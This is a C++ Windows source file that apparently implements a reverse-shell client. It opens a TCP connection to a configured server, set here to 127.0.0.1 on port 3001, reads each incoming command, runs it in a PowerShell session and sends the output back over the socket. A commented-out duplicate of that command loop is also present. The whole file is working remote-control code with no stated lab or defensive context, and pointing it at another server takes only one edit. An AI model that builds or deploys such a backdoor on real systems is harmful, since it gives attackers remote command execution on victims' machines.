#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>
#include "PowerShellSession.hpp"

#pragma comment(lib, "ws2_32.lib")

VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
    INT iBytesReceived;
    CHAR carrRecvbuf[4096];
    std::string szCommandOutput;

    while ((iBytesReceived = recv(socket, carrRecvbuf, sizeof(carrRecvbuf) - 1, 0)) > 0) {
        carrRecvbuf[iBytesReceived] = '\0';
        std::string command(carrRecvbuf);

        std::cout << "[+] Received command: " << command << "\n";
        szCommandOutput = psSession.RunCommand(command);
        send(socket, szCommandOutput.c_str(), szCommandOutput.length(), 0);

    }
}


int main() {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    sockaddr_in serverAddr = {};
    const CHAR* server_ip = "127.0.0.1";
    const INT server_port = 3001;
    PowerShellSession psSession;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        WSACleanup();
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(server_port);

    if (inet_pton(AF_INET, server_ip, &serverAddr.sin_addr) != 1) {
        std::cerr << "Invalid IP address\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connect failed\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cout << "[+] Connected to server " << server_ip << ":" << server_port << "\n";
    CommandListenerLoop(sock, psSession);
    //char recvbuf[4096];
    //int recvlen;
    //while ((recvlen = recv(sock, recvbuf, sizeof(recvbuf) - 1, 0)) > 0) {
    //    recvbuf[recvlen] = '\0';
    //    std::string command(recvbuf);

    //    std::cout << "[+] Received command: " << command << "\n";
    //    std::string output = psSession.RunCommand(command);

    //    // Send output back to server
    //    send(sock, output.c_str(), output.length(), 0);
    //    
    //}

    closesocket(sock);
    WSACleanup();
    return 0;
}
